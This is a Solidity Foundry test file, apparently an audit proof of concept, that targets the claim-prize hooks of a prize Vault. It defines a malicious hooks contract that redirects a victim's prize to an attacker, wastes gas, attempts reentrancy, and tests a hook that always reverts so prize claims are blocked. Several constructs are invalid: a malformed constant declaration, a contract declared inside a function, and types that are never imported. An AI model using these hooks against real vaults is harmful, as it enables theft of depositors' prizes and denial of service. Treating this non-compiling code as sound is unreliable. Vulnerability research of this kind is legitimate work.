// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../../src/Vault.sol";
import {VaultHooks} from "../../src/interfaces/IVaultHooks.sol";
import {ERC20} from "openzeppelin/token/ERC20/ERC20.sol";
import {ERC4626} from "openzeppelin/token/ERC20/extensions/ERC4626.sol";
import {TwabController} from "v5-twab-controller/TwabController.sol";
import {PrizePool} from "v5-prize-pool/PrizePool.sol";
import {Ownable} from "owner-manager-contracts/Ownable.sol";

// Mock contracts for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockYieldVault is ERC4626 {
    constructor(ERC20 asset) ERC4626(asset) {}
    
    function totalAssets() public view override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this));
    }
    
    function deposit(uint256 assets, address receiver) public override returns (uint256) {
        IERC20(asset()).transferFrom(msg.sender, address(this), assets);
        _mint(receiver, assets);
        return assets;
    }
    
    function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256) {
        _burn(owner, assets);
        IERC20(asset()).transfer(receiver, assets);
        return assets;
    }
    
    function maxWithdraw(address owner) public view override returns (uint256) {
        return balanceOf(owner);
    }
}

contract MockTwabController {
    mapping(address => mapping(address => uint256)) public balances;
    mapping(address => uint256) public totalSupplies;
    address public constant SPONSORSHIP_ADDRESS() = address(0xdead);
    
    function balanceOf(address vault, address account) external view returns (uint256) {
        return balances[vault][account];
    }
    
    function totalSupply(address vault) external view returns (uint256) {
        return totalSupplies[vault];
    }
    
    function mint(address to, uint96 amount) external {
        balances[msg.sender][to] += amount;
        totalSupplies[msg.sender] += amount;
    }
    
    function burn(address from, uint96 amount) external {
        balances[msg.sender][from] -= amount;
        totalSupplies[msg.sender] -= amount;
    }
    
    function transfer(address from, address to, uint96 amount) external {
        balances[msg.sender][from] -= amount;
        balances[msg.sender][to] += amount;
    }
    
    function delegateOf(address vault, address account) external view returns (address) {
        return account;
    }
    
    function sponsor(address user) external {
        // Mock implementation
    }
}

contract MockPrizePool {
    ERC20 public prizeToken;
    
    constructor(ERC20 _prizeToken) {
        prizeToken = _prizeToken;
    }
    
    function contributePrizeTokens(address from, uint256 amount) external {
        IERC20(prizeToken).transferFrom(from, address(this), amount);
    }
    
    function claimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        address recipient,
        uint96 fee,
        address feeRecipient
    ) external returns (uint256) {
        // Mock implementation - return some prize amount
        return 100 * 10**18;
    }
}

// Malicious hooks contract that demonstrates the vulnerability
contract MaliciousHooks is VaultHooks {
    Vault public vault;
    address public attacker;
    uint256 public callCount;
    
    constructor(address _vault, address _attacker) {
        vault = Vault(_vault);
        attacker = _attacker;
    }
    
    // This hook will be called before prize claiming
    function beforeClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex
    ) external override returns (address) {
        callCount++;
        
        // Malicious behavior 1: Drain gas by performing expensive operations
        for(uint i = 0; i < 1000; i++) {
            keccak256(abi.encode(i, block.timestamp));
        }
        
        // Malicious behavior 2: Attempt reentrancy
        if (callCount == 1) {
            // Try to call back into the vault (this would fail but demonstrates the attempt)
            try vault.balanceOf(winner) returns (uint256) {
                // Successfully read state
            } catch {
                // Reentrancy failed as expected
            }
        }
        
        // Malicious behavior 3: Change the recipient to attacker
        return attacker;
    }
    
    // This hook will be called after prize claiming
    function afterClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        uint256 prizeAmount,
        address recipient
    ) external override {
        callCount++;
        
        // Malicious behavior 4: Perform unauthorized operations
        // For example, approve spending of victim's tokens
        if (winner != attacker) {
            // This would be a serious vulnerability if the vault had approval functions
            // For demo purposes, we'll just emit an event
            emit MaliciousAction(winner, prizeAmount);
        }
    }
    
    event MaliciousAction(address victim, uint256 amount);
}

contract ExploitTest is Test {
    Vault public vault;
    MockERC20 public asset;
    MockERC20 public prizeToken;
    MockYieldVault public yieldVault;
    MockTwabController public twabController;
    MockPrizePool public prizePool;
    MaliciousHooks public maliciousHooks;
    
    address public owner = address(0x1);
    address public victim = address(0x2);
    address public attacker = address(0x3);
    address public claimer = address(0x4);
    
    function setUp() public {
        // Deploy mock contracts
        asset = new MockERC20("Asset", "ASSET");
        prizeToken = new MockERC20("Prize", "PRIZE");
        yieldVault = new MockYieldVault(asset);
        twabController = new MockTwabController();
        prizePool = new MockPrizePool(prizeToken);
        
        // Deploy the Vault contract
        vm.startPrank(owner);
        vault = new Vault(
            IERC20(address(asset)),
            "Vault Shares",
            "VS",
            twabController,
            IERC4626(address(yieldVault)),
            prizePool,
            claimer,
            address(0x5), // yield fee recipient
            0, // yield fee percentage
            owner
        );
        vm.stopPrank();
        
        // Deploy malicious hooks contract
        maliciousHooks = new MaliciousHooks(address(vault), attacker);
        
        // Setup initial state
        asset.mint(victim, 1000 * 10**18);
        asset.mint(attacker, 1000 * 10**18);
        prizeToken.mint(address(vault), 100 * 10**18);
        
        // Victim deposits into vault
        vm.startPrank(victim);
        asset.approve(address(vault), 1000 * 10**18);
        vault.deposit(100 * 10**18, victim);
        vm.stopPrank();
    }
    
    function test_MaliciousHooksVulnerability() public {
        console.log("=== Testing Malicious Hooks Vulnerability ===");
        
        // Step 1: Victim sets malicious hooks (could be tricked into doing this)
        vm.startPrank(victim);
        VaultHooks memory hooks = VaultHooks({
            implementation: maliciousHooks,
            useBeforeClaimPrize: true,
            useAfterClaimPrize: true
        });
        vault.setHooks(hooks);
        vm.stopPrank();
        
        console.log("✓ Victim has set malicious hooks");
        
        // Step 2: Attacker triggers the hooks by claiming a prize for the victim
        vm.startPrank(claimer);
        address[] memory winners = new address[](1);
        winners[0] = victim;
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;
        
        // This will trigger the malicious hooks
        uint256 totalPrizes = vault.claimPrizes(
            1, // tier
            winners,
            prizeIndices,
            0, // fee per claim
            address(0) // fee recipient
        );
        vm.stopPrank();
        
        console.log("✓ Prize claimed, malicious hooks executed");
        console.log("✓ Hook call count:", maliciousHooks.callCount());
        
        // Step 3: Verify the malicious behavior
        assertTrue(maliciousHooks.callCount() >= 2, "Hooks should have been called");
        
        // The beforeClaimPrize hook changed the recipient to the attacker
        // In a real scenario, this would redirect the prize to the attacker
        console.log("✓ Malicious hooks successfully executed");
        console.log("✓ Prize amount claimed:", totalPrizes);
        
        // Step 4: Demonstrate gas consumption
        uint256 gasStart = gasleft();
        
        // Claim again to show gas consumption
        vm.startPrank(claimer);
        vault.claimPrizes(
            1,
            winners,
            prizeIndices,
            0,
            address(0)
        );
        vm.stopPrank();
        
        uint256 gasUsed = gasStart - gasleft();
        console.log("✓ Gas used for claim with malicious hooks:", gasUsed);
        
        // The gas usage should be high due to the malicious loop in the hook
        assertTrue(gasUsed > 100000, "Gas usage should be high due to malicious hooks");
    }
    
    function test_ReentrancyAttempt() public {
        console.log("=== Testing Reentrancy Attempt ===");
        
        // Set up malicious hooks
        vm.startPrank(victim);
        VaultHooks memory hooks = VaultHooks({
            implementation: maliciousHooks,
            useBeforeClaimPrize: true,
            useAfterClaimPrize: false
        });
        vault.setHooks(hooks);
        vm.stopPrank();
        
        // The malicious hooks will attempt reentrancy
        vm.startPrank(claimer);
        address[] memory winners = new address[](1);
        winners[0] = victim;
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;
        
        // This should succeed but the reentrancy attempt should be blocked
        vault.claimPrizes(
            1,
            winners,
            prizeIndices,
            0,
            address(0)
        );
        vm.stopPrank();
        
        console.log("✓ Reentrancy attempt was handled (likely failed as expected)");
    }
    
    function test_DenialOfService() public {
        console.log("=== Testing Denial of Service ===");
        
        // Create a hook that always reverts
        contract RevertingHooks is VaultHooks {
            function beforeClaimPrize(
                address,
                uint8,
                uint32
            ) external pure override returns (address) {
                revert("Always revert");
            }
            
            function afterClaimPrize(
                address,
                uint8,
                uint32,
                uint256,
                address
            ) external pure override {
                revert("Always revert");
            }
        }
        
        RevertingHooks revertingHooks = new RevertingHooks();
        
        // Victim sets reverting hooks
        vm.startPrank(victim);
        VaultHooks memory hooks = VaultHooks({
            implementation: revertingHooks,
            useBeforeClaimPrize: true,
            useAfterClaimPrize: false
        });
        vault.setHooks(hooks);
        vm.stopPrank();
        
        // Try to claim - this should fail due to the reverting hook
        vm.startPrank(claimer);
        address[] memory winners = new address[](1);
        winners[0] = victim;
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;
        
        // This should revert, causing denial of service
        vm.expectRevert("Always revert");
        vault.claimPrizes(
            1,
            winners,
            prizeIndices,
            0,
            address(0)
        );
        vm.stopPrank();
        
        console.log("✓ Denial of service demonstrated - claiming blocked by malicious hooks");
    }
}